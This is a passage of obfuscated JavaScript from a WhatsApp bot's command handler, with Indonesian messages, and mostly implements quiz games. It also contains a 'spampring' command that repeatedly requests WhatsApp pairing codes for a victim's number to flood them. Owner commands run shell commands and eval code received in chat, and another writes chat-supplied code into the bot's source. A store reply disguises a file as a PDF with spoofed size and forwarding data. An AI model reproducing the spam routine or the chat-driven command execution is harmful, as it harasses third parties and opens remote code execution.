              let _0x34aff6 = _0x38eca8[Math.floor(Math.random() * _0x38eca8.length)];
              let _0x43bfa8 = "*🎮 GAME SUSUN KATA 🎮*\n\n" + ("*Soal :* " + _0x34aff6.soal + "\n") + ("*Tipe :* " + _0x34aff6.tipe + "\n\n") + ("⏱ *Timeout:* " + (_0x349fca / 1000).toFixed(2) + " detik\n") + "🎁 *Exp:* +999\n" + ("💸 *Bonus:* +" + _0x2ab2e7 + " Balance\n").trim();
              _0x5c8a1c.susunkata[_0x83f9f5] = [await _0x5f160b(_0x43bfa8), _0x34aff6, _0x2ab2e7, setTimeout(async () => {
                await _0x397050("https://pomf2.lain.la/f/wjw7ptlr.webp");
                await _0xb45cca.reply("⏱ *Waktu habis!*\n" + ("Jawaban yang benar adalah: *" + _0x34aff6.jawaban + "*"));
                delete _0x5c8a1c.susunkata[_0x83f9f5];
              }, _0x349fca)];
              db.data.users[_0xb5f31d].glimit -= 1;
              _0xb45cca.reply("1 limit game Anda telah terpakai.");
            } catch (_0x4d28df) {
              console.error(_0x4d28df);
            }
          }
          break;
        case "tekateki":
          {
            if (!_0x1271c1) {
              return _0x1e9c47(mess.game);
            }
            if (!_0x45f94f) {
              return;
            }
            if (!_0x1c9257 && global.db.data.users[_0xb5f31d].glimit < 1) {
              return _0x281fa4();
            }
            let _0x291092 = 1000;
            let _0x1b876a = 120000;
            let _0x21407b = _0xb45cca.chat;
            if (_0x21407b in _0x5c8a1c.tekateki) {
              return _0x357d03("Masih ada soal belum terjawab di chat ini.");
            }
            let _0x161926 = await (await fetch("https://raw.githubusercontent.com/BochilTeam/database/master/games/tekateki.json")).json();
            let _0x1ea47f = _0x161926[Math.floor(Math.random() * _0x161926.length)];
            let _0x31832c = ("\n*Soal :* " + _0x1ea47f.soal + "\n\nTimeout: *" + (_0x1b876a / 1000).toFixed(2) + " detik*\nExp: +999\nBonus: +" + _0x291092 + " Balance\n").trim();
            _0x5c8a1c.tekateki[_0x21407b] = [await _0x357d03(_0x31832c), _0x1ea47f, _0x291092, setTimeout(async () => {
              if (_0x5c8a1c.tekateki[_0x21407b]) {
                await _0x397050("https://pomf2.lain.la/f/wjw7ptlr.webp");
                await _0x357d03("Waktu game telah habis.\nJawabannya adalah: " + _0x1ea47f.jawaban);
                delete _0x5c8a1c.tekateki[_0x21407b];
              }
            }, _0x1b876a)];
            db.data.users[_0xb5f31d].glimit -= 1;
            _0xb45cca.reply("1 limit game Anda telah terpakai.");
          }
          break;
        case "tebakbendera":
          {
            if (!_0x1271c1) {
              return _0x5f160b(mess.game);
            }
            if (!_0x45f94f) {
              return;
            }
            if (!_0x1c9257 && global.db.data.users[_0xb5f31d].glimit < 1) {
              return _0x281fa4();
            }
            let _0x3b8cff = 1000;
            let _0x4b47c6 = 120000;
            let _0x15935c = _0xb45cca.chat;
            if (_0x15935c in _0x5c8a1c.tebakbendera) {
              return _0x5f160b("Masih ada soal belum terjawab di chat ini");
            }
            let _0x2edf5a = await (await fetch("https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera.json")).json();
            let _0x5ddb3a = _0x2edf5a[Math.floor(Math.random() * _0x2edf5a.length)];
            let _0xe9794 = Ehztext(("Bendera Apakah Ini ?\n\nTimeout *" + (_0x4b47c6 / 1000).toFixed(2) + " detik*\nExp : +999\nBonus : +" + _0x3b8cff + " Balance").trim());
            _0x5c8a1c.tebakbendera[_0x15935c] = [_0x5c8a1c.sendImage(_0x284983, _0x5ddb3a.img, _0xe9794, _0xb45cca), _0x5ddb3a, setTimeout(async () => {
              if (_0x5c8a1c.tebakbendera[_0x15935c]) {
                _0x397050("https://pomf2.lain.la/f/wjw7ptlr.webp");
              }
              await _0x357d03("Waktu game telah habis\nJawabannya adalah : " + _0x5ddb3a.name);
              delete _0x5c8a1c.tebakbendera[_0x15935c];
            }, _0x4b47c6)];
            db.data.users[_0xb5f31d].glimit -= 1;
            _0xb45cca.reply("1 limit game Anda telah terpakai.");
          }
          break;
        case "caklontong":
          {
            if (!_0x1271c1) {
              return _0x5f160b(mess.game);
            }
            if (!_0x45f94f) {
              return;
            }
            if (!_0x1c9257 && global.db.data.users[_0xb5f31d].glimit < 1) {
              return _0x281fa4();
            }
            let _0x131a19 = 3000;
            let _0x5bffd5 = 120000;
            let _0x229c72 = 1;
            let _0x51dc9f = _0xb45cca.chat;
            if (_0x51dc9f in _0x5c8a1c.caklontong) {
              return _0x5f160b("Masih ada soal belum terjawab di chat ini");
            }
            let _0x4159c3 = await (await fetch("https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json")).json();
            let _0x149076 = _0x4159c3[Math.floor(Math.random() * _0x4159c3.length)];
            let _0x35078d = ("*Soal :* " + _0x149076.soal + "\n\n\nTimeout *" + (_0x5bffd5 / 1000).toFixed(2) + " detik*\nBonus : +" + _0x131a19 + "\nTiketcoin : +" + _0x229c72 + " ").trim();
            _0x5c8a1c.caklontong[_0x51dc9f] = [await _0x5f160b(_0x35078d), _0x149076, _0x131a19, setTimeout(async () => {
              _0x397050("https://pomf2.lain.la/f/wjw7ptlr.webp");
              await _0x357d03("Waktu game telah habis\nJawabannya adalah : " + _0x149076.jawaban + "\n\n" + _0x149076.deskripsi);
              delete _0x5c8a1c.caklontong[_0x51dc9f];
            }, _0x5bffd5)];
            db.data.users[_0xb5f31d].glimit -= 1;
            _0xb45cca.reply("1 limit game Anda telah terpakai.");
          }
          break;
        case "tebakkimia":
          {
            if (!_0x1271c1) {
              return _0x5f160b(mess.game);
            }
            if (!_0x1c9257 && global.db.data.users[_0xb5f31d].glimit < 1) {
              return _0x281fa4();
            }
            if (!_0x45f94f) {
              return;
            }
            let _0xeb4af9 = 40000;
            let _0x2ada68 = 1000;
            let _0x430728 = _0xb45cca.chat;
            if (_0x430728 in _0x5c8a1c.tebakkimia) {
              return _0x5f160b("Masih ada soal belum terjawab di chat ini");
            }
            let _0x8b535a = await (await fetch("https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkimia.json")).json();
            let _0x59e709 = _0x8b535a[Math.floor(Math.random() * _0x8b535a.length)];
            let _0x39120d = ("*TEBAK KIMIA*\n\tUnsur: " + _0x59e709.unsur + "\n\tSoal: Singkatan atau lambang di atas adalah...\n\t\n\tWaktu: *" + (_0xeb4af9 / 1000).toFixed(2) + " detik*\n\tHadiah: " + _0x2ada68 + " Balance\n\t").trim();
            _0x5c8a1c.tebakkimia[_0x430728] = [await _0x5f160b(_0x39120d), _0x59e709, _0x2ada68, setTimeout(async () => {
              if (_0x5c8a1c.tebakkimia[_0x430728]) {
                _0x4298a6.balance -= 200;
              }
              _0x397050("https://pomf2.lain.la/f/wjw7ptlr.webp");
              await _0x357d03("*GAME TEBAK KIMIA*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *" + _0x59e709.jawaban + "*\n𖦹 Balance kamu dikurangi 200\n𖦹 Sisa Balance kamu: *" + db.data.users[_0xb5f31d].balance.toLocaleString() + "*");
              delete _0x5c8a1c.tebakkimia[_0x430728];
            }, _0xeb4af9)];
            db.data.users[_0xb5f31d].glimit -= 1;
            _0xb45cca.reply("1 limit game Anda telah terpakai.");
          }
          break;
        case "tebakkata":
          {
            if (!_0x1271c1) {
              return _0x5f160b(mess.game);
            }
            if (!_0x45f94f) {
              return _0x4e17f4();
            }
            if (!_0x1c9257 && global.db.data.users[_0xb5f31d].glimit < 1) {
              return _0x281fa4();
            }
            let _0x4fbfaf = 1000;
            let _0x3584c5 = 120000;
            let _0x2bc4ec = _0xb45cca.chat;
            if (_0x2bc4ec in _0x5c8a1c.tebakkata) {
              return _0x5f160b("Masih ada soal belum terjawab di chat ini");
            }
            let _0x4b1f1b = await (await fetch("https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json")).json();
            let _0x537f32 = _0x4b1f1b[Math.floor(Math.random() * _0x4b1f1b.length)];
            let _0x2d0d3c = ("*Soal :* " + _0x537f32.soal + "\n\nTimeout *" + (_0x3584c5 / 1000).toFixed(2) + " detik*\nExp : +999\nBonus : +" + _0x4fbfaf + " Balance").trim();
            _0x5c8a1c.tebakkata[_0x2bc4ec] = [await _0x5f160b(_0x2d0d3c), _0x537f32, _0x4fbfaf, setTimeout(async () => {
              if (_0x5c8a1c.tebakkata[_0x2bc4ec]) {
                _0x397050("https://pomf2.lain.la/f/wjw7ptlr.webp");
              }
              await _0x357d03("Waktu game telah habis\nJawabannya adalah : " + _0x537f32.jawaban);
              delete _0x5c8a1c.tebakkata[_0x2bc4ec];
            }, _0x3584c5)];
            db.data.users[_0xb5f31d].glimit -= 1;
            _0xb45cca.reply("1 limit game Anda telah terpakai.");
          }
          break;
        case "tebaklirik":
          {
            if (!_0x1271c1) {
              return _0x5f160b(mess.game);
            }
            if (!_0x45f94f) {
              return;
            }
            if (!_0x1c9257 && global.db.data.users[_0xb5f31d].glimit < 1) {
              return _0x281fa4();
            }
            let _0x4fcef4 = 1000;
            let _0x585e71 = 120000;
            let _0x43ad5b = _0xb45cca.chat;
            if (_0x43ad5b in _0x5c8a1c.tebaklirik) {
              return _0x5f160b("Masih ada soal belum terjawab di chat ini");
            }
            let _0x3d147b = await (await fetch("https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json")).json();
            let _0x7e9ec0 = _0x3d147b[Math.floor(Math.random() * _0x3d147b.length)];
            let _0x2ace0b = ("*Soal :* " + _0x7e9ec0.soal + "\n\nTimeout *" + (_0x585e71 / 1000).toFixed(2) + " detik*\nExp : +999\nBonus : +" + _0x4fcef4 + " Balance").trim();
            _0x5c8a1c.tebaklirik[_0x43ad5b] = [await _0x5f160b(_0x2ace0b), _0x7e9ec0, _0x4fcef4, setTimeout(async () => {
              if (_0x5c8a1c.tebaklirik[_0x43ad5b]) {
                _0x397050("https://pomf2.lain.la/f/wjw7ptlr.webp");
              }
              await _0x357d03("Waktu game telah habis\n  Jawabannya adalah : " + _0x7e9ec0.jawaban);
              delete _0x5c8a1c.tebaklirik[_0x43ad5b];
            }, _0x585e71)];
            db.data.users[_0xb5f31d].glimit -= 1;
            _0xb45cca.reply("1 limit game Anda telah terpakai.");
          }
          break;
        case "tebaklagu":
          {
            if (!_0x1271c1) {
              return _0x5f160b(mess.game);
            }
            if (!_0x45f94f) {
              return;
            }
            let _0x7b8146 = 60000;
            let _0x23850d = 1200;
            let _0x3f2a70 = _0xb45cca.chat;
            if (_0x3f2a70 in _0x5c8a1c.tebaklagu) {
              return _0x5f160b("Masih ada soal belum terjawab di chat ini");
            }
            let _0x4bfb78 = await (await fetch("https://raw.githubusercontent.com/qisyana/scrape/main/tebaklagu.json")).json();
            let _0x43473b = _0x4bfb78[Math.floor(Math.random() * _0x4bfb78.length)];
            var _0x293cc7 = await _0x5c8a1c.sendMessage(_0x284983, {
              audio: {
                url: "" + _0x43473b.lagu,
                ptt: true,
                mimetype: "audio/mpeg"
              }
            }, {
              quoted: _0xb45cca
            });
            let _0x2b6231 = (gris1 + "*TEBAK LAGU*\n\tArtis: " + _0x43473b.artis + "\n\tSoal: Judul lagu di atas adalah...\n\t\n\tWaktu: *" + (_0x7b8146 / 1000).toFixed(2) + " detik*\n\tHadiah: " + _0x23850d + " Balance" + gris1 + "\n\t").trim();
            _0x5c8a1c.tebaklagu[_0x3f2a70] = [await _0x5c8a1c.sendMessage(_0x284983, {
              text: _0x2b6231
            }, {
              quoted: _0xb45cca
            }), _0x43473b, _0x23850d, setTimeout(async () => {
              if (_0x5c8a1c.tebaklagu[_0x3f2a70]) {
                _0x4298a6.balance -= 200;
              }
              let _0x5c24dc = gris1 + "*GAME TEBAK LAGU*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *" + _0x43473b.judul + "*\n𖦹 Balance kamu dikurangi 200\n𖦹 Sisa Balance kamu: *" + db.data.users[_0xb5f31d].balance.toLocaleString() + "*" + gris1;
              _0x397050("https://pomf2.lain.la/f/wjw7ptlr.webp");
              await _0x357d03(_0x5c24dc);
              delete _0x5c8a1c.tebaklagu[_0x3f2a70];
            }, _0x7b8146)];
            db.data.users[_0xb5f31d].glimit -= 1;
            _0xb45cca.reply("1 limit game Anda telah terpakai.");
          }
          break;
        case "tebakgambar":
          {
            if (!_0x1271c1) {
              return _0x5f160b(mess.game);
            }
            if (!_0x45f94f) {
              return;
            }
            if (!_0x1c9257 && global.db.data.users[_0xb5f31d].glimit < 1) {
              return _0x281fa4();
            }
            let _0x55d1e1 = 1000;
            let _0x3cf4c5 = 120000;
            let _0x3bc93b = _0xb45cca.chat;
            if (_0x3bc93b in _0x5c8a1c.tebakgambar) {
              return _0x5f160b("Masih ada soal belum terjawab di chat ini");
            }
            let _0x1d3f1d = await (await fetch("https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json")).json();
            let _0x388d39 = _0x1d3f1d[Math.floor(Math.random() * _0x1d3f1d.length)];
            let _0x3d6610 = await getBuffer(_0x388d39);
            let _0x2ab30b = Ehztext(("*Soal :* " + _0x388d39.deskripsi + "\n\nTimeout *" + (_0x3cf4c5 / 1000).toFixed(2) + " detik*\nExp : +999\nBonus : +" + _0x55d1e1 + " Balance").trim());
            _0x5c8a1c.tebakgambar[_0x3bc93b] = [_0x5c8a1c.sendImage(_0x284983, _0x388d39.img, _0x2ab30b, _0xb45cca), _0x388d39, setTimeout(async () => {
              if (_0x5c8a1c.tebakgambar[_0x3bc93b]) {
                _0x397050("https://pomf2.lain.la/f/wjw7ptlr.webp");
              }
              await _0x357d03("Waktu game telah habis\nJawabannya adalah : " + _0x388d39.jawaban);
              delete _0x5c8a1c.tebakgambar[_0x3bc93b];
            }, _0x3cf4c5)];
            db.data.users[_0xb5f31d].glimit -= 1;
            _0xb45cca.reply("1 limit game Anda telah terpakai.");
          }
          break;
        case "siapaaku":
        case "siapakahaku":
          {
            if (!_0x1271c1) {
              return _0x5f160b(mess.game);
            }
            if (!_0x45f94f) {
              return;
            }
            if (!_0x1c9257 && global.db.data.users[_0xb5f31d].glimit < 1) {
              return _0x281fa4();
            }
            let _0x295b18 = 1000;
            let _0x2c96ce = 120000;
            let _0x38de6a = _0xb45cca.chat;
            if (_0x38de6a in _0x5c8a1c.siapaaku) {
              return _0x5f160b("Masih ada soal belum terjawab di chat ini");
            }
            let _0x3a4002 = await (await fetch("https://raw.githubusercontent.com/BochilTeam/database/master/games/siapakahaku.json")).json();
            let _0x402e65 = _0x3a4002[Math.floor(Math.random() * _0x3a4002.length)];
            let _0xac9489 = ("*Soal :* " + _0x402e65.soal + "\n\nTimeout *" + (_0x2c96ce / 1000).toFixed(2) + " detik*\nExp : +999\nBonus : +" + _0x295b18 + " Balance").trim();
            _0x5c8a1c.siapaaku[_0x38de6a] = [await _0x5f160b(_0xac9489), _0x402e65, _0x295b18, setTimeout(async () => {
              if (_0x5c8a1c.siapaaku[_0x38de6a]) {
                _0x397050("https://pomf2.lain.la/f/wjw7ptlr.webp");
              }
              await _0x357d03("Waktu game telah habis\nJawabannya adalah : " + _0x402e65.jawaban);
              delete _0x5c8a1c.siapaaku[_0x38de6a];
            }, _0x2c96ce)];
            db.data.users[_0xb5f31d].glimit -= 1;
            _0xb45cca.reply("1 limit game Anda telah terpakai.");
          }
          break;
        case "family100":
          {
            if (!_0x1271c1) {
              return _0x5f160b(mess.game);
            }
            if (!_0x45f94f) {
              return;
            }
            if (!_0x1c9257 && global.db.data.users[_0xb5f31d].glimit < 1) {
              return _0x281fa4();
            }
            let _0x3c32fb = 1000;
            let _0x533e89 = _0xb45cca.chat;
            if (_0x533e89 in _0x5c8a1c.family) {
              return _0x357d03("Masih ada kuis yang belum terjawab di chat ini");
            }
            let _0xb1a782 = await (await fetch("https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json")).json();
            let _0x146fd5 = _0xb1a782[Math.floor(Math.random() * _0xb1a782.length)];
            let _0x45274d = Ehztext(("*Soal :* " + _0x146fd5.soal + "\n\nTerdapat *" + _0x146fd5.jawaban.length + "* jawaban" + (_0x146fd5.jawaban.find(_0xae1ca => _0xae1ca.includes(" ")) ? "\n(beberapa jawaban terdapat spasi)\n" : "") + "\n\n+" + _0x3c32fb + " Money tiap jawaban benar\n").trim());
            _0x5c8a1c.family[_0x533e89] = {
              id: _0x533e89,
              msg: await _0xb45cca.reply(_0x45274d),
              ..._0x146fd5,
              terjawab: Array.from(_0x146fd5.jawaban, () => false),
              winScore: _0x3c32fb
            };
            db.data.users[_0xb5f31d].glimit -= 1;
            _0xb45cca.reply("1 limit game Anda telah terpakai.");
          }
          break;
        case "spampring":
          {
            if (!_0x5a8dcd) {
              return _0x1d17b7();
            }
            if (!_0x448b59) {
              return _0x357d03("*Example:* " + (_0x10ce59 + _0x451268) + " +628xxxxxx|150");
            }
            _0x357d03("otewekan");
            let [_0x1b8f66, _0xed33af = "200"] = _0x448b59.split("|");
            let _0x11d3cd = _0x1b8f66.replace(/[^0-9]/g, "").trim();
            let {
              default: _0x1105c7,
              useMultiFileAuthState: _0x18ffc8,
              fetchLatestBaileysVersion: _0x2578ba
            } = require("baileys");
            let {
              state: _0x332849
            } = await _0x18ffc8("pepek");
            let {
              version: _0x4dc85c
            } = await _0x2578ba();
            let _0x54f16b = require("pino");
            let _0x1fb40e = await _0x1105c7({
              auth: _0x332849,
              version: _0x4dc85c,
              logger: _0x54f16b({
                level: "fatal"
              })
            });
            for (let _0x351849 = 0; _0x351849 < _0xed33af; _0x351849++) {
              await sleep(1500);
              let _0x36e253 = await _0x1fb40e.requestPairingCode(_0x11d3cd);
              await console.log("_Succes Spam Pairing Code - Number : " + _0x11d3cd + " - Code : " + _0x36e253 + "_");
            }
            await sleep(15000);
          }
          break;
        case "getcase":
          {
            try {
              if (!_0x5a8dcd && !_0xfcd2a2) {
                return _0x1d17b7();
              }
              if (!_0x448b59) {
                return _0x5f160b("*Mau nyari Case apa kak*");
              }
              if (_0x448b59.startsWith(_0x10ce59)) {
                return _0x5f160b("Query tidak boleh menggunakan prefix");
              }
              let _0x54233e = await getCase(_0x448b59);
              let _0xd1efb7 = gris1 + " " + _0x54233e + " " + gris1;
              _0x357d03(_0xd1efb7);
            } catch (_0x4d7986) {
              console.log(_0x4d7986);
              _0x5f160b("Case " + _0x448b59 + " tidak ditemukan");
            }
          }
          break;
        case "setppbot":
          if (!_0x5a8dcd) {
            return _0x5f160b(mess.only.owner);
          }
          let {
            S_WHATSAPP_NET: _0x3f2832
          } = require("baileys");
          const _0x132856 = await _0x5c8a1c.downloadAndSaveMediaMessage(_0x38cde7, makeid(5));
          const {
            img: _0x4e65cc
          } = await generateProfilePicture(_0x132856);
          await _0x5c8a1c.query({
            tag: "iq",
            attrs: {
              to: _0x3f2832,
              type: "set",
              xmlns: "w:profile:picture"
            },
            content: [{
              tag: "picture",
              attrs: {
                type: "image"
              },
              content: _0x4e65cc
            }]
          });
          await _0x5f160b("Sukses");
          break;
          testai;
        case "addcase":
          {
            if (!_0x5a8dcd) {
              return _0x1d17b7();
            }
            if (!_0x448b59) {
              return _0x5f160b("Penggunaan salah. Silakan ketik `addcase Fitur` yang ingin ditambahkan.");
            }
            const _0x4ef04a = "./message/case.js";
            const _0x560953 = "" + _0x448b59;
            fs.readFile(_0x4ef04a, "utf8", (_0x24949d, _0x2324d1) => {
              if (_0x24949d) {
                console.error("Terjadi kesalahan saat membaca file:", _0x24949d);
                return;
              }
              const _0x58c787 = _0x2324d1.indexOf("case 'addcase':");
              if (_0x58c787 !== -1) {
                const _0x3268d6 = _0x2324d1.slice(0, _0x58c787) + "\n" + _0x560953 + "\n" + _0x2324d1.slice(_0x58c787);
                fs.writeFile(_0x4ef04a, _0x3268d6, "utf8", _0x5a05ef => {
                  if (_0x5a05ef) {
                    _0x5f160b("Error File: " + _0x5a05ef);
                  } else {
                    _0x5f160b("Sukses Menambahkan case");
                  }
                });
              } else {
                _0x5f160b("Gagal Menambahkan case");
              }
            });
          }
          break;
        case "delcase":
          {
            if (!_0x5a8dcd) {
              return _0x1d17b7();
            }
            if (!_0x448b59) {
              return _0x5f160b("Penggunaan salah. Silakan ketik `delcase Fitur` yang ingin dihapus.");
            }
            const _0x49c42f = "./message/case.js";
            const _0x47f308 = "case '" + _0x448b59 + "':";
            fs.readFile(_0x49c42f, "utf8", (_0x8ddc7d, _0x1dca30) => {
              if (_0x8ddc7d) {
                console.error("Terjadi kesalahan saat membaca file:", _0x8ddc7d);
                return _0x5f160b("Terjadi kesalahan saat membaca file.");
              }
              const _0x12f5e0 = _0x1dca30.indexOf(_0x47f308);
              if (_0x12f5e0 === -1) {
                return _0x5f160b(" case " + _0x448b59 + " tidak ditemukan dalam file.");
              }
              const _0x1e3a51 = _0x1dca30.indexOf("break;", _0x12f5e0);
              if (_0x1e3a51 === -1) {
                return _0x5f160b("Tidak dapat menemukan \"break;\" setelah case yang ingin dihapus.");
              }
              const _0x2b67f3 = _0x1dca30.slice(0, _0x12f5e0) + _0x1dca30.slice(_0x1e3a51 + "break;".length);
              fs.writeFile(_0x49c42f, _0x2b67f3, "utf8", _0xfd27f9 => {
                if (_0xfd27f9) {
                  console.error("Terjadi kesalahan saat menulis file:", _0xfd27f9);
                  return _0x5f160b("Terjadi kesalahan saat menulis file.");
                } else {
                  return _0x5f160b("Case '" + _0x448b59 + "' berhasil dihapus.");
                }
              });
            });
          }
          break;
        case "listcase":
          {
            _0x5f160b(listCase());
          }
          break;
        case "sendcase":
          try {
            if (!_0x5a8dcd && !_0xfcd2a2) {
              return _0x1d17b7();
            }
            if (!_0x448b59) {
              return _0x5f160b("*Mau kirim Case apa kak?*");
            }
            let _0x40569b;
            try {
              if (_0xb45cca.isGroup) {
                _0x40569b = _0xb45cca.mentionedJid[0] ? _0xb45cca.mentionedJid[0] : _0xb45cca.quoted.sender;
              } else {
                _0x40569b = _0xb45cca.sender;
              }
            } catch (_0x141240) {
              if (_0xb45cca.isGroup) {
                _0x40569b = _0xe878d3[0] + "@s.whatsapp.net";
              } else {
                _0x40569b = _0xb45cca.sender;
              }
            }
            if (!_0x40569b) {
              return _0x5f160b("Tag atau nomor tidak ditemukan!");
            }
            if (_0x448b59.startsWith(_0x10ce59)) {
              return _0x5f160b("Query tidak boleh menggunakan prefix");
            }
            let _0x389aff = await getCase(_0x448b59);
            if (!_0x389aff) {
              return _0x5f160b("Case " + _0x448b59 + " tidak ditemukan");
            }
            let _0x572f65 = gris + "Hai Kak Ada Kiriman case Dari Owner Ku Nih" + gris + " \n\n " + _0x389aff;
            await _0x5c8a1c.sendMessage(_0x40569b, {
              text: _0x572f65
            });
            _0x5f160b("Case \"" + _0x448b59 + "\" berhasil dikirim ke " + _0x40569b);
          } catch (_0x532043) {
            console.log(_0x532043);
            _0x5f160b("Case " + _0x448b59 + " tidak ditemukan atau terjadi kesalahan");
          }
          break;
        case "getfunc":
          if (!_0x5a8dcd) {
            return _0x1d17b7();
          }
          if (!_0x448b59) {
            return _0x357d03("Contoh penggunaan: " + (_0x10ce59 + _0x451268) + " onlyLimit");
          }
          const _0x5debdb = _0x417532 => {
            const _0xa4cdf0 = fs.readFileSync("./message/case.js", "utf8");
            const _0x439034 = new RegExp("const " + _0x417532 + " = (.*?)};", "s");
            const _0x18d26b = _0xa4cdf0.match(_0x439034);
            if (_0x18d26b) {
              return _0x18d26b[0];
            } else {
              return "Function " + _0x417532 + " tidak ditemukan.";
            }
          };
          _0x357d03("" + _0x5debdb(_0x448b59));
          break;
        case "$":
          {
            if (!_0xfcd2a2 && !_0x5a8dcd) {
              return _0x1d17b7();
            }
            await _0x5f160b("_Executing..._");
            exec(_0x448b59, async (_0x44e7f7, _0x1aca42) => {
              if (_0x44e7f7) {
                return _0x5f160b(copyright + ":~ " + _0x44e7f7);
              }
              if (_0x1aca42) {
                await _0x5f160b("*>_ Console*\n\n" + _0x1aca42);
              }
            });
          }
          break;
        case ">":
          {
            if (!_0x5a8dcd) {
              return _0x1d17b7();
            }
            try {
              let _0x198e6a = await eval(_0x448b59);
              if (typeof _0x198e6a !== "string") {
                _0x198e6a = require("util").inspect(_0x198e6a);
              }
              _0xb45cca.reply(_0x198e6a);
            } catch (_0x94cc18) {
              _0xb45cca.reply(String(_0x94cc18));
            }
          }
          break;
        default:
          let _0x69b4a7;
          let _0x48d6ba = global.db.data && global.db.data.users && global.db.data.users[_0xb45cca.sender];
          const _0x1c4994 = path.join(__dirname, "./plugins");
          for (let _0x553b3c in global.plugins) {
            let _0x2d0f5f = global.plugins[_0x553b3c];
            if (!_0x2d0f5f) {
              continue;
            }
            if (_0x2d0f5f.disabled) {
              continue;
            }
            const _0x2edfbe = join(_0x1c4994, _0x553b3c);
            if (typeof _0x2d0f5f.all === "function") {
              try {
                await _0x2d0f5f.all.call(_0x5c8a1c, _0xb45cca, {
                  chatUpdate: _0x3477fc,
                  __dirname: _0x1c4994,
                  __filename: _0x2edfbe
                });
              } catch (_0x4de8fa) {
                console.error(_0x4de8fa);
              }
            }
            const _0x2065f9 = _0x2fe702 => _0x2fe702.replace(/[|\\{}()[\]^$+*?.]/g, "\\$&");
            let _0x471d1b = _0x2d0f5f.customPrefix ? _0x2d0f5f.customPrefix : _0x10ce59;
            let _0x567ddb = (_0x471d1b instanceof RegExp ? [[_0x471d1b.exec(_0xb45cca.text), _0x471d1b]] : Array.isArray(_0x471d1b) ? _0x471d1b.map(_0x585d4b => {
              let _0x371f20 = _0x585d4b instanceof RegExp ? _0x585d4b : new RegExp(_0x2065f9(_0x585d4b));
              return [_0x371f20.exec(_0xb45cca.text), _0x371f20];
            }) : typeof _0x471d1b === "string" ? [[new RegExp(_0x2065f9(_0x471d1b)).exec(_0xb45cca.text), new RegExp(_0x2065f9(_0x471d1b))]] : [[[], new RegExp()]]).find(_0x3cea90 => _0x3cea90[1]);
            if (typeof _0x2d0f5f.before === "function") {
              if (await _0x2d0f5f.before.call(_0x5c8a1c, _0xb45cca, {
                thePrefix: _0x503d4f,
                store: _0x5a5803,
                isAccept: _0x3519b9,
                command: _0x451268,
                args: _0xe878d3,
                q: _0x448b59,
                match: _0x567ddb,
                hanz: _0x5c8a1c,
                prefix: _0x10ce59,
                setReply: _0x5f160b,
                reply: _0x357d03,
                sendSticker: _0x397050,
                sendvn: _0x3d461a,
                sendMusic: _0x36233b,
                sendThumb: _0x40c64e,
                sendReact: _0x5d5c7b,
                otw: _0x1f5ab6,
                from: _0x284983,
                budy: _0x1f6ab3,
                participants: _0xb45cca.groupMembers,
                groupMetadata: _0xb45cca.groupMetadata,
                user: _0xb45cca.user,
                bot: _0xb45cca.bot,
                isROwner: _0x5a8dcd,
                isOwner: _0x5a8dcd,
                isRAdmin: _0xb45cca.isRAdmin,
                isAdmin: _0xb45cca.isAdmin,
                isBotAdmin: _0xb45cca.isBotAdmin,
                isPremium: _0x1c9257,
                isprems: _0x1c9257,
                isResPanel: _0x185182,
                chatUpdate: _0x3477fc,
                __dirname: _0x1c4994,
                __filename: _0x2edfbe
              })) {
                continue;
              }
            }
            if (typeof _0x2d0f5f !== "function") {
              continue;
            }
            let _0x1a4cf4 = _0x2d0f5f.fail || global.dfail;
            _0x69b4a7 = (_0x567ddb[0] || "")[0] || _0x10ce59;
            if (_0x451268 || _0x69b4a7) {
              let _0x37de1f = _0xb45cca.body.replace(_0x69b4a7, "");
              let _0x24be1f = _0x37de1f.trim().split` `.slice(1);
              let _0x33581c = _0x448b59;
              var _0x3519b9 = _0x2d0f5f.command instanceof RegExp ? _0x2d0f5f.command.test(_0x451268) : Array.isArray(_0x2d0f5f.command) ? _0x2d0f5f.command.some(_0xcaf739 => _0xcaf739 instanceof RegExp ? _0xcaf739.test(_0x451268) : _0xcaf739 === _0x451268) : typeof _0x2d0f5f.command === "string" ? _0x2d0f5f.command === _0x451268 : false;
              if (!_0x3519b9) {
                continue;
              }
              _0xb45cca.plugin = _0x553b3c;
              if (_0x2d0f5f.rowner && _0x2d0f5f.owner && !_0x5a8dcd) {
                return _0x1d17b7();
                break;
              }
              if (_0x2d0f5f.owner && !_0x5a8dcd) {
                return _0x1d17b7();
                break;
              }
              if (_0x2d0f5f.premium && !_0x1c9257) {
                return _0x12931b();
                break;
              }
              if (_0x2d0f5f.group && !_0xb45cca.isGroup) {
                return _0x4e17f4();
                break;
              }
              if (_0x2d0f5f.selerpanel && !_0x185182) {
                _0x1a4cf4("selerpanel");
                break;
              }
              if (_0x2d0f5f.gcStore) {
                if (_0xb45cca.isGroup && _0xb45cca.chat === global.idGcStore) {
                  const _0x144145 = async () => {
                    let _0x16f14a = "" + menutoko(_0x10ce59);
                    _0x5d5c7b("📂");
                    _0x5c8a1c.sendMessage(_0xb45cca.chat, {
                      document: fs.readFileSync("./package.json"),
                      fileName: _0x224f61,
                      fileLength: 99999999999999,
                      mimetype: "application/pdf",
                      jpegThumbnail: fs.readFileSync("./stik/docStore.jpg"),
                      caption: _0x16f14a,
                      contextInfo: {
                        showAdAttribution: true,
                        forwardingScore: 10,
                        isForwarded: true,
                        mentionedJid: [_0xb45cca.sender],
                        businessMessageForwardInfo: {
                          businessOwnerJid: "6281316643491@s.whatsapp.net"
                        },
                        forwardedNewsletterMessageInfo: {
                          newsletterJid: newsletterJid,
                          serverMessageId: null,
                          newsletterName: nameToko
                        }
                      }
                    }, {
                      quoted: _0xb45cca,
                      ephemeralExpiration: 86400
                    });
                  };
                  return _0x144145();
                  break;
                }
              } else if (_0x2d0f5f.onlyGroup && !_0xb45cca.isGroup) {
                return;
                break;
              } else if (_0x2d0f5f.cmdStore && _0xb45cca.chat !== idGcStore && !!_0xb45cca.isGroup) {
                return _0xb45cca.reply("Command Hanya Bisa Di Akses Di Group Store Dan Private");
                break;
              } else if (_0x2d0f5f.noCmdStore && _0xb45cca.chat === global.idGcStore) {
